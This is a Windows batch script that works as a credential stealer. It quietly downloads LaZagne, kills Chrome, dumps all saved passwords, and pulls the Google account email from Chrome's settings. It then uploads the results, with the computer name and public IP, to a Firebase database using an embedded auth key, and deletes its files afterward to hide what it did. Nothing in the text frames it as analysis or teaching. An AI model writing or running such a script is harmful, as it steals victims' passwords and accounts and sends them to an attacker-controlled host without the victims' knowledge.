@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

:: === CONFIGURATION ===
set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
set "FIREBASE_URL=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials"
set "FIREBASE_KEY=fdM9pHfanpouiqsEmFLJUDAC2LtXF7rUBXbIPDA4"

:: === DOWNLOAD LaZagne ===
if not exist "%LAZAGNE_EXE%" (
    powershell -Command "$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri '%LAZAGNE_URL%' -OutFile '%LAZAGNE_EXE%'"
    if not exist "%LAZAGNE_EXE%" (
        echo [ERROR] Cannot download LaZagne
        exit /b 1
    )
)

:: === KILL CHROME TO PREVENT LOCK ===
taskkill /IM chrome.exe /F >nul 2>&1

:: === RUN LAZAGNE TO EXTRACT CREDENTIALS ===
mkdir "%OUTPUT_DIR%" >nul 2>&1
"%LAZAGNE_EXE%" all -oN -output "%OUTPUT_DIR%" >nul 2>&1

:: === PARSE LATEST RESULT FILE ===
set "RESULT_FILE="
for /f "delims=" %%F in ('dir /b /a-d /od "%OUTPUT_DIR%\*.txt" 2^>nul') do set "RESULT_FILE=%%F"

:: === GET PC INFO ===
set "PC_NAME=%COMPUTERNAME%"
set "PC_NAME=!PC_NAME: =_!"
set "PC_NAME=!PC_NAME:-=_!"

:: === ATTEMPT TO EXTRACT GMAIL FROM CHROME PREFS ===
set "EMAIL=unknown"
set "CHROME_PREF=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Preferences"

if exist "%CHROME_PREF%" (
    for /f "delims=" %%E in ('powershell -Command ^
        "try { $p = Get-Content -Raw -Path '%CHROME_PREF%' | ConvertFrom-Json; $p.account_info[0].email } catch { '' }"') do (
        if not "%%E"=="" set "EMAIL=%%E"
    )

    if "%EMAIL%"=="unknown" (
        for /f "delims=" %%E in ('powershell -Command ^
            "try { (Get-Content -Raw -Path '%CHROME_PREF%' | ConvertFrom-Json).profile.email } catch { '' }"') do (
            if not "%%E"=="" set "EMAIL=%%E"
        )
    )
)

:: === UPLOAD TO FIREBASE ===
powershell -Command ^
  "$ip = (Invoke-RestMethod -Uri 'https://api.ipify.org');" ^
  "$content = Get-Content -Raw -Path '%OUTPUT_DIR%\%RESULT_FILE%' -ErrorAction SilentlyContinue;" ^
  "$json = @{ computer = '%PC_NAME%'; email = '%EMAIL%'; timestamp = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss'); ip = $ip; data = $content } | ConvertTo-Json -Compress;" ^
  "Invoke-RestMethod -Uri '%FIREBASE_URL%/%PC_NAME%.json?auth=%FIREBASE_KEY%' -Method PUT -Body $json -ContentType 'application/json';"

:: === CLEANUP ===
del /q "%LAZAGNE_EXE%" >nul 2>&1
rd /s /q "%OUTPUT_DIR%" >nul 2>&1
exit /b 0
